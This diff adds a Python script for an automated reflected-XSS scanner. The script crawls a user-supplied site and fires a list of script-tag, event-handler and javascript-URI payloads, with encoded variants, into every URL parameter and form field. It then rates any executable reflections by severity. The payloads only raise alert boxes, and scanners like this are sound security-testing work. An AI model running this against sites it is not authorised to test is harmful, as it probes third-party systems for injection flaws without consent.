@@ -1,0 +1,447 @@
+!pip -q install requests beautifulsoup4 matplotlib
+
+import requests, re, time, html, random, string, urllib.parse
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import matplotlib.pyplot as plt
+from datetime import datetime
+
+requests.packages.urllib3.disable_warnings()
+
+# ====================== CONFIG ======================
+HEADERS = {"User-Agent": "ProWebXSSScanner/SingleTarget"}
+TIMEOUT = 12
+MAX_THREADS = 10
+CRAWL_LIMIT = 80
+DELAY = 0.2
+
+# ====================== OUTPUT HELPERS ======================
+def hr(): print("─"*95)
+def title(t): hr(); print(f"🚀 {t}"); hr()
+def section(t): print(f"\n📌 {t}"); hr()
+def good(t): print(f"✅ {t}")
+def bad(t): print(f"❌ {t}")
+def warn(t): print(f"⚠️ {t}")
+def info(t): print(f"ℹ️ {t}")
+
+def normalize_url(url):
+    if not url.startswith("http"):
+        url = "http://" + url
+    return url
+
+def same_domain(base, link):
+    return urlparse(base).netloc == urlparse(link).netloc
+
+# ====================== HTTP ======================
+def GET(url):
+    time.sleep(DELAY)
+    return requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS)
+
+def POST(url, data):
+    time.sleep(DELAY)
+    return requests.post(url, data=data, timeout=TIMEOUT, verify=False, headers=HEADERS)
+
+# ====================== MARKER ENGINE ======================
+def make_marker(n=8):
+    return "XSS" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n))
+
+# ====================== PAYLOAD ENGINE ======================
+def make_base_payloads(marker):
+    m = marker
+    payloads = [
+        # old ones
+        f"<script>alert('{m}')</script>",
+        f"\"><svg/onload=alert('{m}')>",
+        f"<img src=x onerror=alert('{m}')>",
+        f"'><img src=x onerror=alert('{m}')>",
+        f"\" autofocus onfocus=alert('{m}') x=\"",
+        f"<details open ontoggle=alert('{m}')>",
+        f"<iframe src=javascript:alert('{m}')>",
+        f"javascript:alert('{m}')",
+
+        # extra payloads
+        f"<script>confirm('{m}')</script>",
+        f"<script>prompt('{m}')</script>",
+        f"<script>window['alert']('{m}')</script>",
+
+        f"</title><script>alert('{m}')</script>",
+        f"</textarea><script>alert('{m}')</script>",
+        f"</style><script>alert('{m}')</script>",
+        f"</script><script>alert('{m}')</script>",
+
+        f"<svg><script>alert('{m}')</script></svg>",
+        f"<svg><animate onbegin=alert('{m}') attributeName=x dur=1s></animate></svg>",
+
+        f"<body onload=alert('{m}')>",
+        f"<input autofocus onfocus=alert('{m}')>",
+        f"<textarea autofocus onfocus=alert('{m}')></textarea>",
+
+        f"\" onmouseover=\"alert('{m}')",
+        f"' onmouseover='alert(\"{m}\")",
+
+        f"<a href=javascript:alert('{m}')>CLICK</a>",
+        f"\"><a href=javascript:alert('{m}')>CLICK</a>",
+
+        f"<iframe srcdoc=\"<script>alert('{m}')</script>\"></iframe>",
+
+        # harmless marker-only fuzz
+        m,
+        f"XSS-{m}-TEST",
+    ]
+
+    # unique order-preserving
+    seen = set()
+    out = []
+    for p in payloads:
+        if p not in seen:
+            seen.add(p)
+            out.append(p)
+    return out
+
+def generate_payload_variants(payload: str):
+    variants = set()
+    raw = payload
+    url_1 = urllib.parse.quote(payload, safe="")
+    url_2 = urllib.parse.quote(url_1, safe="")
+    html_ent = html.escape(payload)
+    mixed = urllib.parse.quote(html_ent, safe="")
+
+    variants.update([raw, url_1, url_2, html_ent, mixed])
+
+    if " " in payload:
+        variants.add(payload.replace(" ", "%09"))
+        variants.add(payload.replace(" ", "%0a"))
+
+    return list(variants)
+
+def build_stronger_payload_list(base_payloads):
+    final_payloads = []
+    for p in base_payloads:
+        final_payloads.extend(generate_payload_variants(p))
+
+    # remove duplicates
+    seen = set()
+    ordered = []
+    for x in final_payloads:
+        if x not in seen:
+            seen.add(x)
+            ordered.append(x)
+    return ordered
+
+# ====================== FALSE POSITIVE CONTROL ======================
+def normalize_text(text: str):
+    versions = set()
+    versions.add(text)
+    versions.add(html.unescape(text))
+    try:
+        versions.add(urllib.parse.unquote(text))
+        versions.add(urllib.parse.unquote(html.unescape(text)))
+    except:
+        pass
+    return list(versions)
+
+def is_safely_escaped(resp_text, marker):
+    esc = html.escape(marker)
+    return (esc in resp_text) and (marker not in resp_text)
+
+def detect_context(resp_text, marker):
+    patterns = {
+        "SCRIPT_TAG": rf"<script[^>]*>.*{re.escape(marker)}.*</script>",
+        "EVENT_HANDLER": rf"on\w+\s*=\s*['\"][^'\"]*{re.escape(marker)}",
+        "JS_URI": rf"javascript:[^\"\'\s>]*{re.escape(marker)}",
+        "SVG_ONLOAD": rf"<svg[^>]*onload\s*=\s*['\"][^'\"]*{re.escape(marker)}",
+        "IMG_ONERROR": rf"<img[^>]*onerror\s*=\s*['\"][^'\"]*{re.escape(marker)}",
+    }
+
+    for name, pat in patterns.items():
+        if re.search(pat, resp_text, flags=re.I | re.S):
+            return True, name
+    return False, None
+
+def xss_false_positive_control(response_text, marker):
+    versions = normalize_text(response_text)
+
+    if not any(marker in v for v in versions):
+        return False, "Marker not reflected"
+
+    if all(is_safely_escaped(v, marker) for v in versions):
+        return False, "Marker reflected but safely escaped"
+
+    for v in versions:
+        ok, ctx = detect_context(v, marker)
+        if ok:
+            return True, f"Executable context detected: {ctx}"
+
+    return False, "Marker reflected but NOT in executable context"
+
+# ====================== SEVERITY ======================
+def severity_score(reason):
+    if "SCRIPT_TAG" in reason or "EVENT_HANDLER" in reason:
+        return "HIGH"
+    if "JS_URI" in reason or "SVG_ONLOAD" in reason or "IMG_ONERROR" in reason:
+        return "MEDIUM"
+    if "Executable context" in reason:
+        return "LOW"
+    return "INFO"
+
+# ====================== CRAWL ======================
+def extract_links(base_url, html_text):
+    soup = BeautifulSoup(html_text, "html.parser")
+    links = set()
+
+    for tag in soup.find_all(["a", "link"], href=True):
+        links.add(urljoin(base_url, tag["href"]).split("#")[0])
+
+    for s in soup.find_all("script", src=True):
+        links.add(urljoin(base_url, s["src"]).split("#")[0])
+
+    js_links = re.findall(r"""https?://[^\s"'<>]+""", html_text)
+    for l in js_links:
+        links.add(l.split("#")[0])
+
+    rel_links = re.findall(r"""["'](/[^"']+)["']""", html_text)
+    for l in rel_links:
+        links.add(urljoin(base_url, l).split("#")[0])
+
+    clean = set()
+    for l in links:
+        if same_domain(base_url, l):
+            clean.add(l)
+
+    return list(clean)
+
+def crawl(target, limit=CRAWL_LIMIT):
+    visited = set()
+    queue = [target]
+
+    section("Crawling Website")
+    while queue and len(visited) < limit:
+        url = queue.pop(0)
+        if url in visited:
+            continue
+        try:
+            r = GET(url)
+            visited.add(url)
+            for link in extract_links(url, r.text):
+                if link not in visited and link not in queue:
+                    queue.append(link)
+        except:
+            continue
+
+    good(f"Total Crawled Pages: {len(visited)}")
+    return visited
+
+def get_param_urls(urls):
+    results = []
+    for u in urls:
+        if "?" in u:
+            q = parse_qs(urlparse(u).query)
+            if q:
+                results.append(u)
+    return list(set(results))
+
+# ====================== XSS SCAN ======================
+def build_injected_url(url, payload):
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    injected = {k: payload for k in qs.keys()}
+    new_query = urlencode(injected, doseq=True)
+    return urlunparse(parsed._replace(query=new_query))
+
+def scan_url_xss(url):
+    marker = make_marker()
+    payloads = build_stronger_payload_list(make_base_payloads(marker))
+
+    for payload in payloads:
+        test_url = build_injected_url(url, payload)
+        try:
+            r = GET(test_url)
+            vulnerable, reason = xss_false_positive_control(r.text, marker)
+            if vulnerable:
+                return {
+                    "type": "Reflected XSS (URL)",
+                    "severity": severity_score(reason),
+                    "target": url,
+                    "marker": marker,
+                    "reason": reason,
+                    "payload": payload,
+                    "evidence": test_url
+                }
+        except:
+            pass
+    return None
+
+def extract_forms(url, html_text):
+    soup = BeautifulSoup(html_text, "html.parser")
+    return soup.find_all("form")
+
+def form_details(form):
+    action = form.get("action")
+    method = form.get("method", "get").lower()
+    inputs = []
+    for inp in form.find_all(["input", "textarea"]):
+        name = inp.get("name")
+        if name:
+            inputs.append(name)
+    return {"action": action, "method": method, "inputs": inputs}
+
+def scan_forms_xss(page_url):
+    marker = make_marker()
+    payloads = build_stronger_payload_list(make_base_payloads(marker))
+
+    try:
+        r = GET(page_url)
+        forms = extract_forms(page_url, r.text)
+        if not forms:
+            return None
+
+        for f in forms:
+            info_form = form_details(f)
+            if not info_form["inputs"]:
+                continue
+
+            action_url = urljoin(page_url, info_form["action"]) if info_form["action"] else page_url
+
+            for payload in payloads:
+                data = {k: payload for k in info_form["inputs"]}
+                try:
+                    if info_form["method"] == "post":
+                        res = POST(action_url, data)
+                    else:
+                        res = requests.get(action_url, params=data, timeout=TIMEOUT, verify=False, headers=HEADERS)
+
+                    vulnerable, reason = xss_false_positive_control(res.text, marker)
+                    if vulnerable:
+                        return {
+                            "type": "Reflected XSS (Form)",
+                            "severity": severity_score(reason),
+                            "target": page_url,
+                            "marker": marker,
+                            "reason": reason,
+                            "payload": payload,
+                            "evidence": f"{info_form['method'].upper()} {action_url}"
+                        }
+                except:
+                    continue
+    except:
+        pass
+
+    return None
+
+# ====================== REPORT + CHARTS ======================
+def show_charts(findings):
+    url_xss = sum(1 for f in findings if f["type"] == "Reflected XSS (URL)")
+    form_xss = sum(1 for f in findings if f["type"] == "Reflected XSS (Form)")
+
+    sev_counts = {
+        "HIGH": sum(1 for f in findings if f["severity"] == "HIGH"),
+        "MEDIUM": sum(1 for f in findings if f["severity"] == "MEDIUM"),
+        "LOW": sum(1 for f in findings if f["severity"] == "LOW"),
+        "INFO": sum(1 for f in findings if f["severity"] == "INFO"),
+    }
+
+    section("Charts & Analytics")
+
+    # Chart 1: Findings by Type
+    plt.figure()
+    plt.title("Findings by Type")
+    plt.bar(["URL XSS", "Form XSS"], [url_xss, form_xss])
+    plt.xlabel("Type")
+    plt.ylabel("Count")
+    plt.show()
+
+    # Chart 2: Website Status
+    plt.figure()
+    plt.title("Website Status")
+    safe = 1 if len(findings) == 0 else 0
+    vuln = 1 if len(findings) > 0 else 0
+    plt.pie([safe, vuln], labels=["Safe", "Vulnerable"], autopct="%1.0f%%")
+    plt.show()
+
+    # Chart 3: Severity Distribution
+    plt.figure()
+    plt.title("Severity Distribution")
+    plt.bar(list(sev_counts.keys()), list(sev_counts.values()))
+    plt.xlabel("Severity")
+    plt.ylabel("Count")
+    plt.show()
+
+def pro_scan(target):
+    target = normalize_url(target)
+
+    title("PRO WEB XSS SCANNER (Single Target)")
+    print(f"🎯 Target: {target}")
+    print(f"🕒 Start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"⚙️ Crawl Limit: {CRAWL_LIMIT} | Threads: {MAX_THREADS}")
+    print("🧠 False Positive Control: ENABLED")
+    print("🧪 Encoded Variants: ENABLED")
+    hr()
+
+    findings = []
+
+    crawled_pages = crawl(target, CRAWL_LIMIT)
+    param_urls = get_param_urls(crawled_pages)
+
+    section("Parameter URLs Found")
+    good(f"Total Parameter URLs: {len(param_urls)}")
+
+    section("Scanning URL Parameters (Multi-thread)")
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        futures = [ex.submit(scan_url_xss, u) for u in param_urls]
+        for f in as_completed(futures):
+            res = f.result()
+            if res:
+                findings.append(res)
+
+    section("Scanning Forms (Multi-thread)")
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        futures = [ex.submit(scan_forms_xss, p) for p in crawled_pages]
+        for f in as_completed(futures):
+            res = f.result()
+            if res:
+                findings.append(res)
+
+    # FINAL REPORT
+    title("FINAL REPORT")
+    print(f"🌐 Total Crawled Pages: {len(crawled_pages)}")
+    print(f"🔗 Parameter URLs Found: {len(param_urls)}")
+    print(f"🔥 Total Confirmed Vulnerabilities: {len(findings)}")
+    hr()
+
+    high = sum(1 for f in findings if f["severity"] == "HIGH")
+    medium = sum(1 for f in findings if f["severity"] == "MEDIUM")
+    low = sum(1 for f in findings if f["severity"] == "LOW")
+
+    if len(findings) == 0:
+        verdict = "SAFE ✅"
+        good("✅ Website looks SAFE from Reflected XSS (based on this scan).")
+    elif high > 0:
+        verdict = "CRITICAL RISK ❌ (HIGH severity XSS found)"
+        bad("❌ HIGH severity XSS found! Website is at critical risk.")
+    elif medium > 0:
+        verdict = "VULNERABLE ❌ (MEDIUM severity XSS found)"
+        bad("❌ MEDIUM severity XSS found! Website is vulnerable.")
+    else:
+        verdict = "LOW RISK ⚠️ (Only LOW findings)"
+        warn("⚠️ Only LOW severity findings detected.")
+
+    print(f"\n🏁 Verdict: {verdict}")
+    hr()
+
+    if findings:
+        section("Top Confirmed Findings (first 10)")
+        for i, f in enumerate(findings[:10], 1):
+            print(f"\n#{i} 🔥 {f['type']}  |  Severity: {f['severity']}")
+            print(f"🎯 Target: {f['target']}")
+            print(f"🧬 Marker: {f['marker']}")
+            print(f"📌 Reason: {f['reason']}")
+            print(f"💉 Payload: {f['payload'][:160]}{'...' if len(f['payload'])>160 else ''}")
+            print(f"🧾 Evidence: {f['evidence']}")
+
+    show_charts(findings)
+    title("Scan Completed ✅")
+
+# RUN
+target_site = input("Enter target URL (Legal only): ")
+pro_scan(target_site)
